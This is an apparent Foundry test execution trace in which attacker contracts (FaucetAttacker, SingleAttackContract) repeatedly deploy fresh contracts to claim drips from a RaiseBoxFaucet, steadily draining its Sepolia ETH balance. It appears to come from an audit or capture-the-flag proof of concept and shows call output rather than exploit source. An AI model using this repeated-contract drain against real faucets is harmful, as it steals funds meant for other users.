    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 877 bytes of code
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [0] console::log("contract counter: ", 49) [staticcall]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [11115842] SingleAttackContract::callFaucet()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [11115083] RaiseBoxFaucet::claimFaucetTokens()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [11078915] SingleAttackContract::receive{value: 5000000000000000}()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [11071257] FaucetAttacker::receive{value: 5000000000000000}()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [516] RaiseBoxFaucet::sepEthAmountToDrip() [staticcall]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 5000000000000000 [5e15]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [380] RaiseBoxFaucet::getContractSepEthBalance() [staticcall]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 750000000000000000 [7.5e17]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [220299] → new SingleAttackContract@0x33527E096d307Fc25c37D5333Ee1568c9DC30E65
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 877 bytes of code
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [0] console::log("contract counter: ", 50) [staticcall]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [10813873] SingleAttackContract::callFaucet()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [10813114] RaiseBoxFaucet::claimFaucetTokens()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [10776946] SingleAttackContract::receive{value: 5000000000000000}()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [10769288] FaucetAttacker::receive{value: 5000000000000000}()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [516] RaiseBoxFaucet::sepEthAmountToDrip() [staticcall]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 5000000000000000 [5e15]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [380] RaiseBoxFaucet::getContractSepEthBalance() [staticcall]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 745000000000000000 [7.45e17]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [220299] → new SingleAttackContract@0xF87a9E891F6468595C6424efF3B31AcC186e32e9
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 877 bytes of code
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [0] console::log("contract counter: ", 51) [staticcall]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [10511904] SingleAttackContract::callFaucet()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [10511145] RaiseBoxFaucet::claimFaucetTokens()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [10474977] SingleAttackContract::receive{value: 5000000000000000}()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [10467319] FaucetAttacker::receive{value: 5000000000000000}()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [516] RaiseBoxFaucet::sepEthAmountToDrip() [staticcall]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 5000000000000000 [5e15]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [380] RaiseBoxFaucet::getContractSepEthBalance() [staticcall]
